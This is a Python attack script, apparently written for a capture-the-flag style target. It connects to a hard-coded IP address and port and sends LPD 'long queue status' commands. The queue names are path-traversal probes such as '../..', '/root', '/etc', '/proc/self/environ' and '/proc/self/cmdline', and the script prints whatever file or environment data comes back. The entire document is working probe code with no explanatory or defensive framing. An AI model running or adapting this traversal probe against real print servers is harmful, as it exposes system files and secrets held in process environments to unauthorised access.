#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def try_queue_name(queue_name):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        
        # Comando 0x04 (long queue status)
        data = b'\x04' + queue_name.encode() + b'\n'
        s.sendall(data)
        time.sleep(0.5)
        
        resp = b''
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        
        s.close()
        return resp
    except Exception as e:
        return f"Error: {e}".encode()

# Intentar diferentes paths como cola
queues = [
    "lp",
    "/",
    "/var",
    "/var/spool",
    "/var/spool/lpd",
    "/var/spool/lpd/lp",
    "/etc",
    "/root",
    "/tmp",
    "/home",
    ".",
    "..",
    "../..",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

for q in queues:
    print(f"=== Queue: {q!r} ===")
    resp = try_queue_name(q)
    print(f"Length: {len(resp)}")
    if len(resp) > 1:
        print(f"Hex: {resp[:100].hex()}")
        try:
            decoded = resp.decode('utf-8', errors='replace')
            print(f"Text: {decoded[:500]}")
        except:
            print(f"Raw: {resp[:100]}")
    elif len(resp) == 1:
        print(f"Single byte: 0x{resp[0]:02x}")
    print()